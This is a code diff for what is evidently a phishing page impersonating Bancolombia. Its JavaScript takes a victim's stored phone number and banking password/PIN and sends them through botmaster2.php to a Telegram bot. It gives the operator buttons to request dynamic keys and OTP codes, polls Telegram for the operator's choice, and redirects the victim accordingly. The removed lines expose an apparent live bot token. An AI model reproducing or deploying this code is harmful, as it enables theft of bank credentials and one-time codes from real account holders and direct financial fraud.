@@ -89,102 +89,117 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
 
-  if (
-    !bancoldata ||
-    !bancoldata.celular ||
-    !bancoldata.nacimiento ||
-    !bancoldata.tipo ||
-    !bancoldata.identificador ||
-    !bancoldata.digitosFinales ||
-    !bancoldata.clave
-  ) {
+  if (!bancoldata || !bancoldata.clave) {
     console.error("Faltan datos en 'bancoldata'");
-    alert("Por favor, vuelve al inicio y completa los datos.");
+    alert("Datos incompletos. Por favor, vuelve a iniciar.");
     window.location.href = "index.html";
     return;
   }
 
-  // Construir mensaje para Telegram
-  let mensaje = "📥 NUEVO REGISTRO DE USUARIO\n";
-  mensaje += "📱 Celular: " + bancoldata.celular + "\n";
-  mensaje += "🎂 Fecha de nacimiento: " + bancoldata.nacimiento + "\n";
-  mensaje += "🧾 Tipo de acceso: " + bancoldata.tipo + "\n";
-  mensaje += "💳 Identificador: " + bancoldata.identificador + "\n";
-  mensaje += "🔢 Últimos 2 dígitos: " + bancoldata.digitosFinales + "\n";
-  mensaje += "🔐 Clave/NIP: " + bancoldata.clave;
+  const usuario = bancoldata.celular || "No definido";
+  const clave = bancoldata.clave;
 
-  console.log("Enviando a Telegram:", mensaje);
+  const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+  localStorage.setItem('transactionId', transactionId);
 
-  // ENVÍO a botmaster2.php
-  await fetch("botmaster2.php", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "data=" + encodeURIComponent(mensaje)
-  });
+  const message = `
+<b>INGRESO BANCOLOMBIA</b>
+--------------------------------------------------
+🆔 <b>ID:</b> ${transactionId}
+👤 <b>Usuario:</b> ${usuario}
+🔐 <b>Clave:</b> ${clave}
+--------------------------------------------------`;
 
-  // Inicia verificación por botón Telegram
-  const transactionId = `${Date.now()}-${Math.floor(Math.random() * 99999)}`; // genera un ID simple
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "Pedir Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
+      [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
+      [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
+      [{ text: "Error de Logo - Bancolombia", callback_data: `error_logo:${transactionId}` }],
+      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
+    ]
+  };
 
+  // ENVIAR A botmaster2.php
+  try {
+    const res = await fetch("botmaster2.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "data=" + encodeURIComponent(message) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
+    });
+    const result = await res.text();
+    console.log("Respuesta botmaster2.php:", result);
+    await checkPaymentVerification(transactionId);
+  } catch (error) {
+    console.error("Error al enviar a Telegram:", error);
+    if (loader) loader.style.display = "none";
+  }
+
+  // VERIFICAR BOTÓN PRESIONADO
   async function checkPaymentVerification(transactionId) {
     try {
-      const response = await fetch(`https://api.telegram.org/bot7844799050:AAEr7wChEkAp31ktChjaTlguv1aUykSbaxw/getUpdates`);
-      const data = await response.json();
+      const res = await fetch("https://api.telegram.org/botTU_BOT_TOKEN/getUpdates");
+      const data = await res.json();
 
-      const verificationUpdate = data.result.find(update =>
+      const action = data.result.find(update =>
         update.callback_query &&
         [
           `pedir_dinamica:${transactionId}`,
-          `pedir_cajero:${transactionId}`,
           `pedir_otp:${transactionId}`,
-          `pedir_token:${transactionId}`,
           `error_tc:${transactionId}`,
-          `tarjeta_credito:${transactionId}`,
           `error_logo:${transactionId}`,
           `confirm_finalizar:${transactionId}`
         ].includes(update.callback_query.data)
       );
 
-      if (verificationUpdate) {
+      if (action) {
         if (loader) loader.style.display = "none";
 
-        switch (verificationUpdate.callback_query.data) {
-          case `pedir_dinamica:${transactionId}`:
+        const actionType = action.callback_query.data.split(":")[0];
+
+        const statusMap = {
+          pedir_dinamica: "Clave Dinámica",
+          pedir_otp: "Código OTP",
+          error_tc: "Error TC",
+          error_logo: "Error de Logo",
+          confirm_finalizar: "Finalización Exitosa"
+        };
+
+        // Enviar mensaje de confirmación
+        await fetch("sendStatus.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ status: statusMap[actionType] || "Desconocido" })
+        });
+
+        // Redirección según botón
+        switch (actionType) {
+          case "pedir_dinamica":
             window.location.href = "dinacol.php";
             break;
-          case `pedir_cajero:${transactionId}`:
-            window.location.href = "ccajero-id.php";
-            break;
-          case `pedir_otp:${transactionId}`:
-          case `pedir_token:${transactionId}`:
+          case "pedir_otp":
             window.location.href = "index-otp.html";
             break;
-          case `tarjeta_credito:${transactionId}`:
-            window.location.href = "cards.html";
+          case "error_tc":
+            window.location.href = "errortc.html";
             break;
-          case `error_tc:${transactionId}`:
-            alert("Error en tarjeta. Verifique los datos.");
-            window.location.href = "../../pay/";
+          case "error_logo":
+            alert("Error en el inicio de sesión. Reintente.");
+            window.location.href = "index.html";
             break;
-          case `error_logo:${transactionId}`:
-            alert("Error en el logo. Reintente.");
-            window.location.href = "index-pc-error.html";
-            break;
-          case `confirm_finalizar:${transactionId}`:
-            window.location.href = "../../checking.php";
+          case "confirm_finalizar":
+            window.location.href = "https://www.bancolombia.com/personas";
             break;
         }
       } else {
         setTimeout(() => checkPaymentVerification(transactionId), 2000);
       }
-    } catch (error) {
-      console.error("Error en la verificación:", error);
+    } catch (err) {
+      console.error("Error al verificar acción:", err);
       setTimeout(() => checkPaymentVerification(transactionId), 2000);
     }
   }
-
-  checkPaymentVerification(transactionId);
 });
 </script>
-
 </body>
 </html>
